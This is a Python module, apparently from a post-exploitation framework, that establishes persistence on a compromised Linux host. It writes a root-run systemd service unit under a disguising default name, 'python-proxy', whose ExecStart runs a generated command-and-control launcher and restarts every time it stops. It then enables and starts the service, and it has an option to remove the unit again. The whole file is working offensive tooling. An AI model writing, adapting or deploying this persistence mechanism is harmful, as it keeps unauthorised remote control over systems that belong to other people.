class Module:

    def __init__(self, mainMenu, params=[]):

        # metadata info about the module, not modified during runtime
        self.info = {
            # name for the module that will appear in module menus
            'Name': 'Persistence with systemd service unit and Launcher code',

            # list of one or more authors for the module
            'Author': ['@sleventyeleven'],

            # more verbose multi-line description of the module
            'Description': 'This module establishes persistence via systemd',

            # True if the module needs to run in the background
            'Background' : False,

            # File extension to save the file as
            'OutputExtension' : "",

            # if the module needs administrative privileges
            'NeedsAdmin' : True,

            # True if the method doesn't touch disk/is reasonably opsec safe
            'OpsecSafe' : False,

            # list of any references/other comments
            'Comments': ['']
        }

        # any options needed by the module, settable during runtime
        self.options = {
            # format:
            #   value_name : {description, required, default_value}
            'Agent' : {
                # The 'Agent' option is the only one that MUST be in a module
                'Description'   :   'Agent to establish persistence',
                'Required'      :   True,
                'Value'         :   ''
            },
            'Remove' : {
                'Description'   :   'Remove Persistence. True/False',
                'Required'      :   False,
                'Value'         :   ''
            },
            'ServiceName' : {
                'Description'   :   'Name of the Systemd service unit',
                'Required'      :   False,
                'Value'         :   'python-proxy'
            },
            'Listener' : {
                'Description'   :   'Listener to use.',
                'Required'      :   True,
                'Value'         :   ''
            },
            'LittleSnitch' : {
                'Description'   :   'Set for stager LittleSnitch checks.',
                'Required'      :   True,
                'Value'         :   'False'
            }
        }

        # save off a copy of the mainMenu object to access external functionality
        #   like listeners/agent handlers/etc.
        self.mainMenu = mainMenu

        # During instantiation, any settable option parameters
        #   are passed as an object set to the module and the
        #   options dictionary is automatically set. This is mostly
        #   in case options are passed on the command line
        if params:
            for param in params:
                # parameter format is [Name, Value]
                option, value = param
                if option in self.options:
                    self.options[option]['Value'] = value

    def generate(self):
        Remove = self.options['Remove']['Value']
        listenerName = self.options['Listener']['Value']
        serviceName = self.options['ServiceName']['Value']
        littleSnitch = self.options['LittleSnitch']['Value']
        userAgent = self.options['Agent']['Value']

        # generate the launcher code
        launcher = self.mainMenu.stagers.generate_launcher(listenerName, userAgent=userAgent,  littlesnitch=littleSnitch)
        launcher = launcher.replace('"', '\"')
        launcher = launcher.replace("'", "\\'")
        launcher = launcher.replace(" | python &", "")
        launcher = launcher.replace("echo ", "")
        if launcher == "":
            print helpers.color("[!] Error in launcher command generation.")
            return ""

        script = """
import subprocess
import sys
import os
Remove = "%s"
if os.path.isdir("/usr/lib/systemd"):
    if Remove == "True":
        print subprocess.Popen('rm /usr/lib/systemd/system/%s.service && systemctl daemon-reload', shell=True, stdout=subprocess.PIPE).stdout.read()
        print "Finished"
    else:
        try:
            os.makedirs('/usr/lib/systemd/system')
        except OSError:
            if not os.path.isdir('/usr/lib/systemd/system'):
                raise
        serviceFile = open('/usr/lib/systemd/system/%s.service', 'w')
        serviceFile.write('[Unit]\\n')
        serviceFile.write('Description=%s Manager Service\\n')
        serviceFile.write('After=network-online.target\\n')
        serviceFile.write('Wants=network-online.target\\n\\n')
        serviceFile.write('[Service]\\n')
        serviceFile.write('Type=forking\\n')
        serviceFile.write('ExecStart=/usr/bin/python -c %s\\n')
        serviceFile.write('Restart=always\\n')
        serviceFile.write('RestartSec=1\\n')
        serviceFile.write('User=root\\n')
        serviceFile.write('TimeoutSec=1200\\n\\n')
        serviceFile.write('[Install]\\n')
        serviceFile.write('WantedBy=multi-user.target\\n')
        serviceFile.close()
        print subprocess.Popen('systemctl daemon-reload && systemctl enable %s.service && systemctl start %s.service', shell=True, stdout=subprocess.PIPE).stdout.read()
        print "Finished"
""" % (Remove, serviceName, serviceName, serviceName, launcher,  serviceName, serviceName)
        return script
